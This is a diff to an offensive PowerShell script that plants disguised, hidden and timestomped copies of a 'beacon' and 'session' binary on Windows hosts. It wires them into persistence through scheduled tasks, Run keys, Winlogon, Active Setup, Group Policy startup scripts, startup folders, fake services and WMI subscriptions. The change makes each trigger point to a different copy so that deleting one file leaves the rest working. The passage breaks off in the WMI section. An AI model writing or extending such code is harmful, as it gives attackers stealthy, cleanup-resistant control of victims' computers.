@@ -12,6 +12,9 @@
 #   G - BITS persistence       Self-requeuing notify loop
 #   H - Misc                   SilentProcessExit, screensaver, print monitor, LSA
 #
+# Each persistence mechanism points to a DIFFERENT planted copy of the binary.
+# Deleting one file does not kill all triggers.
+#
 # Run as: Administrator or SYSTEM
 #Requires -RunAsAdministrator
 #Requires -Version 5.1
@@ -221,6 +224,18 @@ function Get-TaskXml {
 # =============================================================================
 Write-Section "A - Payload Staging (12 locations each)"
 
+# -- Guaranteed pre-stage: ensures Primary always has a .exe path --
+Write-Info "Pre-staging guaranteed .exe copies to staging base..."
+if (-not (Test-Path $StagingBase)) { New-Item -ItemType Directory -Path $StagingBase -Force -ErrorAction SilentlyContinue | Out-Null }
+$preBeaconPath  = Join-Path $StagingBase "${pfx}beacon_primary.exe"
+$preSessionPath = Join-Path $StagingBase "${pfx}session_primary.exe"
+try { Copy-Item $BeaconPath  $preBeaconPath  -Force -ErrorAction Stop; Set-StealthAttributes $preBeaconPath;  Invoke-Timestomp $preBeaconPath  } catch { $preBeaconPath  = $null }
+try { Copy-Item $SessionPath $preSessionPath -Force -ErrorAction Stop; Set-StealthAttributes $preSessionPath; Invoke-Timestomp $preSessionPath } catch { $preSessionPath = $null }
+$script:PrimaryBeacon  = if ($preBeaconPath)  { $preBeaconPath  } else { $BeaconPath  }
+$script:PrimarySession = if ($preSessionPath) { $preSessionPath } else { $SessionPath }
+Write-Success "  Guaranteed beacon  .exe: $($script:PrimaryBeacon)"
+Write-Success "  Guaranteed session .exe: $($script:PrimarySession)"
+
 $stageNamePool = @(
     "svchost_diag",   "taskhostw_mon",   "wermgr_svc",
     "diagtracksvc",   "lsaiso_ext",      "cryptsvc_mon",
@@ -269,34 +284,64 @@ for ($i = 0; $i -lt $stageDirs.Count; $i++) {
     } else { Add-Log "A" "Session" $sDest "FAIL" }
 }
 
-$script:PrimaryBeacon  = if ($script:StagedBeacons.Count  -gt 0) { $script:StagedBeacons[0]  } else { $BeaconPath  }
-$script:PrimarySession = if ($script:StagedSessions.Count -gt 0) { $script:StagedSessions[0] } else { $SessionPath }
+# Override primary with a hidden system-dir copy if any staging succeeded
+if ($script:StagedBeacons.Count  -gt 0) { $script:PrimaryBeacon  = $script:StagedBeacons[0]  }
+if ($script:StagedSessions.Count -gt 0) { $script:PrimarySession = $script:StagedSessions[0] }
 Write-Info "Primary beacon  : $($script:PrimaryBeacon)"
 Write-Info "Primary session : $($script:PrimarySession)"
 Write-StateLog
 
 # =============================================================================
+# ROUND-ROBIN DISTRIBUTORS
+# Each call returns the next planted copy in sequence so every persistence
+# mechanism points to a different file. Deleting one file kills only one trigger.
+# =============================================================================
+$script:BeaconIdx  = 0
+$script:SessionIdx = 0
+
+function Get-NextBeacon {
+    if ($script:StagedBeacons.Count -gt 0) {
+        $r = $script:StagedBeacons[$script:BeaconIdx % $script:StagedBeacons.Count]
+    } else {
+        $r = $script:PrimaryBeacon
+    }
+    $script:BeaconIdx++
+    return $r
+}
+
+function Get-NextSession {
+    if ($script:StagedSessions.Count -gt 0) {
+        $r = $script:StagedSessions[$script:SessionIdx % $script:StagedSessions.Count]
+    } else {
+        $r = $script:PrimarySession
+    }
+    $script:SessionIdx++
+    return $r
+}
+
+# =============================================================================
 # SECTION B - SCHEDULED TASKS (16 total, XML, PT5M, staggered)
+# Each task gets a different planted copy
 # =============================================================================
 Write-Section "B - Scheduled Tasks (16 x PT5M, Hidden, SYSTEM)"
 
 $taskDefs = @(
-    @{ Folder = "Microsoft\Windows\WindowsUpdate";             Name = "USOSessionWorker2";     Payload = $script:PrimaryBeacon  },
-    @{ Folder = "Microsoft\Windows\Diagnosis";                 Name = "DiagTrackScheduler";    Payload = $script:PrimaryBeacon  },
-    @{ Folder = "Microsoft\Windows\Defrag";                    Name = "StorOptimizer";         Payload = $script:PrimaryBeacon  },
-    @{ Folder = "Microsoft\Windows\DiskCleanup";               Name = "SilentCleanup2";        Payload = $script:PrimaryBeacon  },
-    @{ Folder = "Microsoft\Windows\NetTrace";                  Name = "NetworkDiagLogger";     Payload = $script:PrimaryBeacon  },
-    @{ Folder = "Microsoft\Windows\Registry";                  Name = "RegIdleBackup2";        Payload = $script:PrimaryBeacon  },
-    @{ Folder = "Microsoft\Windows\PerfTrack";                 Name = "PerfCounterSync";       Payload = $script:PrimaryBeacon  },
-    @{ Folder = "Microsoft\Windows\CertificateServicesClient"; Name = "AutoUpdate2";           Payload = $script:PrimaryBeacon  },
-    @{ Folder = "Microsoft\Windows\USOPrivate";                Name = "UsoSessionWorker3";     Payload = $script:PrimarySession },
-    @{ Folder = "Microsoft\Windows\InstallService";            Name = "WinDataCollector";      Payload = $script:PrimarySession },
-    @{ Folder = "Microsoft\Windows\MemoryDiagnostic";          Name = "ProcessMemoryDiag";     Payload = $script:PrimarySession },
-    @{ Folder = "Microsoft\Windows\WDI";                       Name = "ResolutionHost2";       Payload = $script:PrimarySession },
-    @{ Folder = "Microsoft\Windows\ApplicationData";           Name = "CleanupTempState2";     Payload = $script:PrimarySession },
-    @{ Folder = "Microsoft\Windows\Shell";                     Name = "CreateObjectTask2";     Payload = $script:PrimarySession },
-    @{ Folder = "Microsoft\Windows\ErrorDetails";              Name = "EnableErrorDetails2";   Payload = $script:PrimarySession },
-    @{ Folder = "Microsoft\Windows\BrokerInfrastructure";      Name = "BrokerMaintenance2";    Payload = $script:PrimarySession }
+    @{ Folder = "Microsoft\Windows\WindowsUpdate";             Name = "USOSessionWorker2";   Payload = (Get-NextBeacon)  },
+    @{ Folder = "Microsoft\Windows\Diagnosis";                 Name = "DiagTrackScheduler";  Payload = (Get-NextBeacon)  },
+    @{ Folder = "Microsoft\Windows\Defrag";                    Name = "StorOptimizer";        Payload = (Get-NextBeacon)  },
+    @{ Folder = "Microsoft\Windows\DiskCleanup";               Name = "SilentCleanup2";       Payload = (Get-NextBeacon)  },
+    @{ Folder = "Microsoft\Windows\NetTrace";                  Name = "NetworkDiagLogger";    Payload = (Get-NextBeacon)  },
+    @{ Folder = "Microsoft\Windows\Registry";                  Name = "RegIdleBackup2";       Payload = (Get-NextBeacon)  },
+    @{ Folder = "Microsoft\Windows\PerfTrack";                 Name = "PerfCounterSync";      Payload = (Get-NextBeacon)  },
+    @{ Folder = "Microsoft\Windows\CertificateServicesClient"; Name = "AutoUpdate2";          Payload = (Get-NextBeacon)  },
+    @{ Folder = "Microsoft\Windows\USOPrivate";                Name = "UsoSessionWorker3";    Payload = (Get-NextSession) },
+    @{ Folder = "Microsoft\Windows\InstallService";            Name = "WinDataCollector";     Payload = (Get-NextSession) },
+    @{ Folder = "Microsoft\Windows\MemoryDiagnostic";          Name = "ProcessMemoryDiag";    Payload = (Get-NextSession) },
+    @{ Folder = "Microsoft\Windows\WDI";                       Name = "ResolutionHost2";      Payload = (Get-NextSession) },
+    @{ Folder = "Microsoft\Windows\ApplicationData";           Name = "CleanupTempState2";    Payload = (Get-NextSession) },
+    @{ Folder = "Microsoft\Windows\Shell";                     Name = "CreateObjectTask2";    Payload = (Get-NextSession) },
+    @{ Folder = "Microsoft\Windows\ErrorDetails";              Name = "EnableErrorDetails2";  Payload = (Get-NextSession) },
+    @{ Folder = "Microsoft\Windows\BrokerInfrastructure";      Name = "BrokerMaintenance2";   Payload = (Get-NextSession) }
 )
 
 $bTaskOk = 0; $sTaskOk = 0
@@ -309,7 +354,7 @@ for ($i = 0; $i -lt $taskDefs.Count; $i++) {
     $taskPath = "\$folder\"
     $cmd      = $td.Payload
 
-    Write-Info "Task [$($i+1)/16] $taskPath$name (offset +${offset}s)"
+    Write-Info "Task [$($i+1)/16] $taskPath$name -> $cmd"
     try {
         New-TaskSubfolder -FolderPath $folder
         $xml = Get-TaskXml -Command $cmd -OffsetSeconds $offset -AddLogon $addLogon -Description "Windows $name management host"
@@ -331,36 +376,38 @@ Write-StateLog
 # =============================================================================
 Write-Section "C - Registry Boot Persistence"
 
-# C1: HKLM Run (3 beacon + 3 session)
+# C1: HKLM Run (3 beacon + 3 session, each a different planted copy)
 Write-Section "C1 - HKLM Run"
 $hklmRunKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
 @(
-    @{ Name = "${pfx}WerFaultSvcHost"; Path = $script:PrimaryBeacon  },
-    @{ Name = "${pfx}CryptSvcMonitor"; Path = $script:PrimaryBeacon  },
-    @{ Name = "${pfx}DiagTrackHelper"; Path = $script:PrimaryBeacon  },
-    @{ Name = "${pfx}WmiPerfSvcHost";  Path = $script:PrimarySession },
-    @{ Name = "${pfx}DcomSvcMonitor";  Path = $script:PrimarySession },
-    @{ Name = "${pfx}NtServiceHelper"; Path = $script:PrimarySession }
+    @{ Name = "${pfx}WerFaultSvcHost"; Path = (Get-NextBeacon)  },
+    @{ Name = "${pfx}CryptSvcMonitor"; Path = (Get-NextBeacon)  },
+    @{ Name = "${pfx}DiagTrackHelper"; Path = (Get-NextBeacon)  },
+    @{ Name = "${pfx}WmiPerfSvcHost";  Path = (Get-NextSession) },
+    @{ Name = "${pfx}DcomSvcMonitor";  Path = (Get-NextSession) },
+    @{ Name = "${pfx}NtServiceHelper"; Path = (Get-NextSession) }
 ) | ForEach-Object {
     try {
         Set-ItemProperty -Path $hklmRunKey -Name $_.Name -Value ('"' + $_.Path + '"') -Type String -Force
-        Write-Success "  HKLM Run: $($_.Name)"
+        Write-Success "  HKLM Run: $($_.Name) -> $($_.Path)"
         Add-Log "C1" "RunKey" "$hklmRunKey\$($_.Name)" "OK"
     } catch { Write-Warn "  C1 failed [$($_.Name)]: $_" }
 }
 
 # C2: HKCU Run (2 beacon + 2 session) + all offline user hives
 Write-Section "C2 - HKCU Run + offline hives"
+$c2b1 = Get-NextBeacon; $c2b2 = Get-NextBeacon
+$c2s1 = Get-NextSession; $c2s2 = Get-NextSession
 $hkcuRunKey = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
 @(
-    @{ Name = "${pfx}WinDiagSvc";   Path = $script:PrimaryBeacon  },
-    @{ Name = "${pfx}WinSvcHelper"; Path = $script:PrimaryBeacon  },
-    @{ Name = "${pfx}WinMonSvc";    Path = $script:PrimarySession },
-    @{ Name = "${pfx}WinCacheSvc";  Path = $script:PrimarySession }
+    @{ Name = "${pfx}WinDiagSvc";   Path = $c2b1 },
+    @{ Name = "${pfx}WinSvcHelper"; Path = $c2b2 },
+    @{ Name = "${pfx}WinMonSvc";    Path = $c2s1 },
+    @{ Name = "${pfx}WinCacheSvc";  Path = $c2s2 }
 ) | ForEach-Object {
     try {
         Set-ItemProperty -Path $hkcuRunKey -Name $_.Name -Value ('"' + $_.Path + '"') -Type String -Force
-        Write-Success "  HKCU Run (current): $($_.Name)"
+        Write-Success "  HKCU Run (current): $($_.Name) -> $($_.Path)"
         Add-Log "C2" "RunKey" "$hkcuRunKey\$($_.Name)" "OK"
     } catch { Write-Warn "  C2 HKCU failed: $_" }
 }
@@ -376,64 +423,66 @@ Get-ChildItem "C:\Users" -Directory -ErrorAction SilentlyContinue |
             try {
                 $hiveRun = "Registry::${tmpKey}\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
                 if (-not (Test-Path $hiveRun)) { New-Item -Path $hiveRun -Force | Out-Null }
-                Set-ItemProperty $hiveRun -Name "${pfx}WinDiagSvc" -Value ('"' + $script:PrimaryBeacon  + '"') -Force
-                Set-ItemProperty $hiveRun -Name "${pfx}WinMonSvc"  -Value ('"' + $script:PrimarySession + '"') -Force
+                Set-ItemProperty $hiveRun -Name "${pfx}WinDiagSvc" -Value ('"' + $c2b1 + '"') -Force
+                Set-ItemProperty $hiveRun -Name "${pfx}WinMonSvc"  -Value ('"' + $c2s1 + '"') -Force
                 $offlineOk++
             } finally { & reg.exe unload $tmpKey 2>&1 | Out-Null }
         }
     }
 Write-Success "C2: Applied to $offlineOk offline user hives"
 
-# C3: WOW6432Node Run
+# C3: WOW6432Node Run (2 beacon + 2 session)
 Write-Section "C3 - WOW6432Node Run"
 $wowRunKey = "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
 @(
-    @{ Name = "${pfx}WowDiagHelper"; Path = $script:PrimaryBeacon  },
-    @{ Name = "${pfx}WowWerSvc";     Path = $script:PrimaryBeacon  },
-    @{ Name = "${pfx}WowMonSvc";     Path = $script:PrimarySession },
-    @{ Name = "${pfx}WowPerfSvc";    Path = $script:PrimarySession }
+    @{ Name = "${pfx}WowDiagHelper"; Path = (Get-NextBeacon)  },
+    @{ Name = "${pfx}WowWerSvc";     Path = (Get-NextBeacon)  },
+    @{ Name = "${pfx}WowMonSvc";     Path = (Get-NextSession) },
+    @{ Name = "${pfx}WowPerfSvc";    Path = (Get-NextSession) }
 ) | ForEach-Object {
     try {
         Set-ItemProperty -Path $wowRunKey -Name $_.Name -Value ('"' + $_.Path + '"') -Type String -Force
-        Write-Success "  WOW64 Run: $($_.Name)"
+        Write-Success "  WOW64 Run: $($_.Name) -> $($_.Path)"
         Add-Log "C3" "RunKey" "$wowRunKey\$($_.Name)" "OK"
     } catch { Write-Warn "  C3 failed [$($_.Name)]: $_" }
 }
 
 # C4: Winlogon Userinit append
 Write-Section "C4 - Winlogon Userinit"
+$c4Beacon = Get-NextBeacon
 try {
     $wlKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
     $cur   = (Get-ItemProperty $wlKey -Name "Userinit" -ErrorAction Stop).Userinit
-    if ($cur -notlike "*$($script:PrimaryBeacon)*") {
-        Set-ItemProperty $wlKey -Name "Userinit" -Value ($cur.TrimEnd(',') + ",$($script:PrimaryBeacon)") -Force
-        Write-Success "C4 Userinit: appended beacon"
+    if ($cur -notlike "*$c4Beacon*") {
+        Set-ItemProperty $wlKey -Name "Userinit" -Value ($cur.TrimEnd(',') + ",$c4Beacon") -Force
+        Write-Success "C4 Userinit: appended $c4Beacon"
         Add-Log "C4" "Winlogon" "Userinit" "OK"
     } else { Write-Info "C4 Userinit: already present" }
 } catch { Write-Warn "C4 Userinit failed: $_" }
 
 # C5: Winlogon Shell append
 Write-Section "C5 - Winlogon Shell"
+$c5Session = Get-NextSession
 try {
     $wlKey    = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
     $curShell = (Get-ItemProperty $wlKey -Name "Shell" -ErrorAction Stop).Shell
     if (-not $curShell) { $curShell = "explorer.exe" }
-    if ($curShell -notlike "*$($script:PrimarySession)*") {
-        Set-ItemProperty $wlKey -Name "Shell" -Value ($curShell.TrimEnd(',') + ",$($script:PrimarySession)") -Force
-        Write-Success "C5 Shell: appended session"
+    if ($curShell -notlike "*$c5Session*") {
+        Set-ItemProperty $wlKey -Name "Shell" -Value ($curShell.TrimEnd(',') + ",$c5Session") -Force
+        Write-Success "C5 Shell: appended $c5Session"
         Add-Log "C5" "Winlogon" "Shell" "OK"
     } else { Write-Info "C5 Shell: already present" }
 } catch { Write-Warn "C5 Shell failed: $_" }
 
-# C6: Active Setup StubPath (3 beacon + 2 session)
+# C6: Active Setup StubPath (3 beacon + 2 session, each a different copy)
 Write-Section "C6 - Active Setup StubPath"
 $activeSetupBase = "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components"
 @(
-    @{ GUID = "{8A69D345-D564-463C-AFF1-A69D9E530F96}"; Path = $script:PrimaryBeacon;  Label = "Google Update Core"     },
-    @{ GUID = "{89820200-ECBD-11CF-8B85-00AA005B4383}"; Path = $script:PrimaryBeacon;  Label = "Microsoft Active Setup" },
-    @{ GUID = "{76E4F460-2C62-4E3A-A5E6-00AA005B0083}"; Path = $script:PrimaryBeacon;  Label = "Microsoft Edge Compat"  },
-    @{ GUID = "{44BBA840-CC51-11CF-AAFA-00AA00B6015C}"; Path = $script:PrimarySession; Label = "Outlook Express"        },
-    @{ GUID = "{2179C5D3-EBFF-11CF-B6FD-00AA00B4E220}"; Path = $script:PrimarySession; Label = "NetMeeting"             }
+    @{ GUID = "{8A69D345-D564-463C-AFF1-A69D9E530F96}"; Path = (Get-NextBeacon);  Label = "Google Update Core"     },
+    @{ GUID = "{89820200-ECBD-11CF-8B85-00AA005B4383}"; Path = (Get-NextBeacon);  Label = "Microsoft Active Setup" },
+    @{ GUID = "{76E4F460-2C62-4E3A-A5E6-00AA005B0083}"; Path = (Get-NextBeacon);  Label = "Microsoft Edge Compat"  },
+    @{ GUID = "{44BBA840-CC51-11CF-AAFA-00AA00B6015C}"; Path = (Get-NextSession); Label = "Outlook Express"        },
+    @{ GUID = "{2179C5D3-EBFF-11CF-B6FD-00AA00B4E220}"; Path = (Get-NextSession); Label = "NetMeeting"             }
 ) | ForEach-Object {
     try {
         $asKey = "$activeSetupBase\$($_.GUID)"
@@ -442,13 +491,14 @@ $activeSetupBase = "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components"
         Set-ItemProperty $asKey -Name "StubPath"    -Value ('"' + $_.Path + '"')       -Force
         Set-ItemProperty $asKey -Name "Version"     -Value "1,0,0,1"                   -Force
         Set-ItemProperty $asKey -Name "IsInstalled" -Value 1 -Type DWord               -Force
-        Write-Success "  Active Setup: $($_.GUID)"
+        Write-Success "  Active Setup: $($_.GUID) -> $($_.Path)"
         Add-Log "C6" "ActiveSetup" $asKey "OK"
     } catch { Write-Warn "  C6 Active Setup [$($_.GUID)] failed: $_" }
 }
 
 # C7: Group Policy State machine startup script
 Write-Section "C7 - GP State Startup Script"
+$c7Beacon = Get-NextBeacon
 try {
     $gpBase   = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\State\Machine\Scripts\Startup\0"
     $gpScript = "$gpBase\0"
@@ -458,18 +508,18 @@ try {
     Set-ItemProperty $gpBase   -Name "SOM-ID"       -Value "Local"    -Force
     Set-ItemProperty $gpBase   -Name "Count"        -Value 1 -Type DWord -Force
     Set-ItemProperty $gpBase   -Name "ExecTime"     -Value ([byte[]](0,0,0,0,0,0,0,0)) -Type Binary -Force
-    Set-ItemProperty $gpScript -Name "Script"       -Value $script:PrimaryBeacon -Force
+    Set-ItemProperty $gpScript -Name "Script"       -Value $c7Beacon -Force
     Set-ItemProperty $gpScript -Name "Parameters"   -Value "" -Force
     Set-ItemProperty $gpScript -Name "IsPowershell" -Value 0 -Type DWord -Force
     Set-ItemProperty $gpScript -Name "ExecTime"     -Value ([byte[]](0,0,0,0,0,0,0,0)) -Type Binary -Force
-    Write-Success "C7 GP startup script: $($script:PrimaryBeacon)"
+    Write-Success "C7 GP startup script: $c7Beacon"
     Add-Log "C7" "GPStartup" $gpScript "OK"
 } catch { Write-Warn "C7 GP startup script failed: $_" }
 
 Write-StateLog
 
 # =============================================================================
-# SECTION D - STARTUP FOLDERS
+# SECTION D - STARTUP FOLDERS (each file type gets a different planted copy)
 # =============================================================================
 Write-Section "D - Startup Folders (LNK + BAT + CMD + EXE)"
 
@@ -487,72 +537,76 @@ foreach ($sFolder in $startupFolders) {
     }
     Write-Info "Startup folder: $sFolder"
 
+    # Each file type gets a fresh copy from the distributor
+    $dLnkB = Get-NextBeacon;  $dLnkS = Get-NextSession
+    $dBatB = Get-NextBeacon;  $dBatS = Get-NextSession
+    $dCmdB = Get-NextBeacon;  $dCmdS = Get-NextSession
+    $dExeB = Get-NextBeacon;  $dExeS = Get-NextSession
+
     if ($wsh) {
         try {
             $lnkB = Join-Path $sFolder "${pfx}WinDiagHelper.lnk"
             $lnk  = $wsh.CreateShortcut($lnkB)
-            $lnk.TargetPath       = $script:PrimaryBeacon
-            $lnk.WorkingDirectory = $env:SystemRoot
-            $lnk.Description      = "Windows Diagnostic Helper"
-            $lnk.IconLocation     = "$env:SystemRoot\System32\shell32.dll,21"
+            $lnk.TargetPath = $dLnkB; $lnk.WorkingDirectory = $env:SystemRoot
+            $lnk.Description = "Windows Diagnostic Helper"
+            $lnk.IconLocation = "$env:SystemRoot\System32\shell32.dll,21"
             $lnk.Save()
             Set-StealthAttributes $lnkB; Invoke-Timestomp $lnkB
-            Add-Log "D" "LNK" $lnkB "OK"; Write-Success "  LNK beacon: $lnkB"
+            Add-Log "D" "LNK" $lnkB "OK"; Write-Success "  LNK beacon: $lnkB -> $dLnkB"
         } catch { Write-Warn "  D LNK beacon failed: $_" }
 
         try {
             $lnkS = Join-Path $sFolder "${pfx}WinSvcHelper.lnk"
             $lnk  = $wsh.CreateShortcut($lnkS)
-            $lnk.TargetPath       = $script:PrimarySession
-            $lnk.WorkingDirectory = $env:SystemRoot
-            $lnk.Description      = "Windows Service Helper"
-            $lnk.IconLocation     = "$env:SystemRoot\System32\shell32.dll,21"
+            $lnk.TargetPath = $dLnkS; $lnk.WorkingDirectory = $env:SystemRoot
+            $lnk.Description = "Windows Service Helper"
+            $lnk.IconLocation = "$env:SystemRoot\System32\shell32.dll,21"
             $lnk.Save()
             Set-StealthAttributes $lnkS; Invoke-Timestomp $lnkS
-            Add-Log "D" "LNK" $lnkS "OK"; Write-Success "  LNK session: $lnkS"
+            Add-Log "D" "LNK" $lnkS "OK"; Write-Success "  LNK session: $lnkS -> $dLnkS"
         } catch { Write-Warn "  D LNK session failed: $_" }
     }
 
     try {
         $batB = Join-Path $sFolder "${pfx}windiag_helper.bat"
-        [System.IO.File]::WriteAllText($batB, "@echo off`r`nstart /B `"`" `"$($script:PrimaryBeacon)`"`r`n", [System.Text.Encoding]::ASCII)
+        [System.IO.File]::WriteAllText($batB, "@echo off`r`nstart /B `"`" `"$dBatB`"`r`n", [System.Text.Encoding]::ASCII)
         Set-StealthAttributes $batB; Invoke-Timestomp $batB
-        Add-Log "D" "BAT" $batB "OK"; Write-Success "  BAT beacon: $batB"
+        Add-Log "D" "BAT" $batB "OK"; Write-Success "  BAT beacon: $batB -> $dBatB"
     } catch { Write-Warn "  D BAT beacon failed: $_" }
 
     try {
         $batS = Join-Path $sFolder "${pfx}winsvc_helper.bat"
-        [System.IO.File]::WriteAllText($batS, "@echo off`r`nstart /B `"`" `"$($script:PrimarySession)`"`r`n", [System.Text.Encoding]::ASCII)
+        [System.IO.File]::WriteAllText($batS, "@echo off`r`nstart /B `"`" `"$dBatS`"`r`n", [System.Text.Encoding]::ASCII)
         Set-StealthAttributes $batS; Invoke-Timestomp $batS
-        Add-Log "D" "BAT" $batS "OK"; Write-Success "  BAT session: $batS"
+        Add-Log "D" "BAT" $batS "OK"; Write-Success "  BAT session: $batS -> $dBatS"
     } catch { Write-Warn "  D BAT session failed: $_" }
 
     try {
         $cmdB = Join-Path $sFolder "${pfx}windiag_svc.cmd"
-        [System.IO.File]::WriteAllText($cmdB, "@echo off`r`nstart /B `"`" `"$($script:PrimaryBeacon)`"`r`n", [System.Text.Encoding]::ASCII)
+        [System.IO.File]::WriteAllText($cmdB, "@echo off`r`nstart /B `"`" `"$dCmdB`"`r`n", [System.Text.Encoding]::ASCII)
         Set-StealthAttributes $cmdB; Invoke-Timestomp $cmdB
         Add-Log "D" "CMD" $cmdB "OK"
     } catch { Write-Warn "  D CMD beacon failed: $_" }
 
     try {
         $cmdS = Join-Path $sFolder "${pfx}winsvc_mon.cmd"
-        [System.IO.File]::WriteAllText($cmdS, "@echo off`r`nstart /B `"`" `"$($script:PrimarySession)`"`r`n", [System.Text.Encoding]::ASCII)
+        [System.IO.File]::WriteAllText($cmdS, "@echo off`r`nstart /B `"`" `"$dCmdS`"`r`n", [System.Text.Encoding]::ASCII)
         Set-StealthAttributes $cmdS; Invoke-Timestomp $cmdS
         Add-Log "D" "CMD" $cmdS "OK"
     } catch { Write-Warn "  D CMD session failed: $_" }
 
     $exeB = Join-Path $sFolder "${pfx}windiag_host.exe"
-    $r = Copy-Stealth -Source $BeaconPath -Destination $exeB
-    if ($r) { Add-Log "D" "EXE" $exeB "OK"; Write-Success "  EXE beacon: $exeB" }
+    $r = Copy-Stealth -Source $dExeB -Destination $exeB
+    if ($r) { Add-Log "D" "EXE" $exeB "OK"; Write-Success "  EXE beacon: $exeB (src: $dExeB)" }
 
     $exeS = Join-Path $sFolder "${pfx}winsvc_host.exe"
-    $r = Copy-Stealth -Source $SessionPath -Destination $exeS
-    if ($r) { Add-Log "D" "EXE" $exeS "OK"; Write-Success "  EXE session: $exeS" }
+    $r = Copy-Stealth -Source $dExeS -Destination $exeS
+    if ($r) { Add-Log "D" "EXE" $exeS "OK"; Write-Success "  EXE session: $exeS (src: $dExeS)" }
 }
 Write-StateLog
 
 # =============================================================================
-# SECTION E - WINDOWS SERVICES
+# SECTION E - WINDOWS SERVICES (each service gets a different planted copy)
 # =============================================================================
 Write-Section "E - Windows Services (4 auto-start, SYSTEM)"
 
@@ -570,22 +624,23 @@ function New-WrapperPs1 {
 }
 
 $svcDefs = @(
-    @{ Name = "WerFaultSvcExt";  Display = "Windows Error Reporting Fault Extension";    Desc = "Provides host process support for Windows Error Reporting.";     Payload = $script:PrimaryBeacon  },
-    @{ Name = "CryptSvcMonitor"; Display = "Cryptographic Service Monitor";              Desc = "Monitors and maintains cryptographic service health.";            Payload = $script:PrimaryBeacon  },
-    @{ Name = "WmiPerfSvcHost";  Display = "WMI Performance Adapter Host Service";       Desc = "Provides WMI performance counter host adapter functionality.";    Payload = $script:PrimarySession },
-    @{ Name = "DiagTrackSvcExt"; Display = "Connected User Experiences Diagnostics Ext"; Desc = "Extends diagnostics and telemetry for connected user experiences."; Payload = $script:PrimarySession }
+    @{ Name = "WerFaultSvcExt";  Display = "Windows Error Reporting Fault Extension";    Desc = "Provides host process support for Windows Error Reporting.";     Payload = (Get-NextBeacon)  },
+    @{ Name = "CryptSvcMonitor"; Display = "Cryptographic Service Monitor";              Desc = "Monitors and maintains cryptographic service health.";            Payload = (Get-NextBeacon)  },
+    @{ Name = "WmiPerfSvcHost";  Display = "WMI Performance Adapter Host Service";       Desc = "Provides WMI performance counter host adapter functionality.";    Payload = (Get-NextSession) },
+    @{ Name = "DiagTrackSvcExt"; Display = "Connected User Experiences Diagnostics Ext"; Desc = "Extends diagnostics and telemetry for connected user experiences."; Payload = (Get-NextSession) }
 )
 
 foreach ($svcDef in $svcDefs) {
-    Write-Info "Service: $($svcDef.Name)"
+    $svcPayload = $svcDef.Payload
+    Write-Info "Service: $($svcDef.Name) -> $svcPayload"
     try {
         $wrapPath   = Join-Path $StagingBase "${pfx}$($svcDef.Name)_wrap.ps1"
-        $wrapResult = New-WrapperPs1 -PayloadPath $svcDef.Payload -WrapperPath $wrapPath
+        $wrapResult = New-WrapperPs1 -PayloadPath $svcPayload -WrapperPath $wrapPath
 
         if ($wrapResult) {
             $binPath = "`"$psExe`" -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$wrapPath`""
         } else {
-            $binPath = "`"$($svcDef.Payload)`""
+            $binPath = "`"$svcPayload`""
         }
 
         $existingSvc = Get-Service -Name $svcDef.Name -ErrorAction SilentlyContinue
@@ -600,7 +655,7 @@ foreach ($svcDef in $svcDefs) {
         & sc.exe failure $svcDef.Name reset= 86400 actions= restart/5000/restart/5000/restart/5000 2>&1 | Out-Null
         Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\$($svcDef.Name)" -Name "DisplayName" -Value $svcDef.Display -Force -ErrorAction SilentlyContinue
         Write-Success "  Service created: $($svcDef.Name)"
-        Add-Log "E" "Service" $svcDef.Name "OK"
+        Add-Log "E" "Service" $svcDef.Name "OK" "payload=$svcPayload"
     } catch {
         Write-Err "  Service $($svcDef.Name) failed: $_"
         Add-Log "E" "Service" $svcDef.Name "FAIL" "$_"
@@ -609,7 +664,7 @@ foreach ($svcDef in $svcDefs) {
 Write-StateLog
 
 # =============================================================================
-# SECTION F - WMI EVENT SUBSCRIPTIONS
+# SECTION F - WMI EVENT SUBSCRIPTIONS (each gets a different planted copy)
 # =============================================================================
 Write-Section "F - WMI Event Subscriptions (3 subscriptions)"
 
@@ -650,13 +705,17 @@ function New-WmiSubscription {
     }
 }
 
-Write-Section "F1 - WMI: svchost.exe start -> beacon"
+$f1Beacon  = Get-NextBeacon
+$f2Session = Get-NextSession
+$f3Beacon  = Get-NextBeacon
+
+Write-Section "F1 - WMI: explorer.exe start -> beacon"
 $f1ok = New-WmiSubscription `
-    -FilterName    "WMIProviderCompatFilter" `
-    -ConsumerName  "WMIPerfSyncConsumer" `
-    -Query         "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'svchost.exe'" `
-    -Command       ('"' + $script:PrimaryBeacon + '"')
-if ($f1ok) { Add-Log "F1" "WMI" "svchost-start/beacon" "OK" }
+    -FilterName    "WMIExplorerStartFilter" `
+    -ConsumerName  "WMIExplorerConsumer" `
+    -Query         "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'explorer.exe'" `
+    -Command       ('"' + $f1Beacon + '"')
+if ($f1ok) { Add-Log "F1" "WMI" "explorer-start/beacon" "OK" "cmd=$f1Beacon" }
 
 Write-Section "F2 - WMI: IntervalTimer 300s -> session"
 try {
@@ -672,16 +731,16 @@ $f2ok = New-WmiSubscription `
     -ConsumerName   "WMITimerConsumer_MNOD300" `
     -Query          "SELECT * FROM __TimerEvent WHERE TimerID = 'MNODTimer300'" `
     -QueryNamespace "root\cimv2" `
-    -Command        ('"' + $script:PrimarySession + '"')
-if ($f2ok) { Add-Log "F2" "WMI" "timer300s/session" "OK" }
+    -Command        ('"' + $f2Session + '"')
+if ($f2ok) { Add-Log "F2" "WMI" "timer300s/session" "OK" "cmd=$f2Session" }
 
-Write-Section "F3 - WMI: explorer.exe start -> beacon"
+Write-Section "F3 - WMI: lsass.exe start -> beacon"
 $f3ok = New-WmiSubscription `
-    -FilterName   "WMIExplorerStartFilter" `
-    -ConsumerName "WMIExplorerConsumer" `
-    -Query        "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'explorer.exe'" `
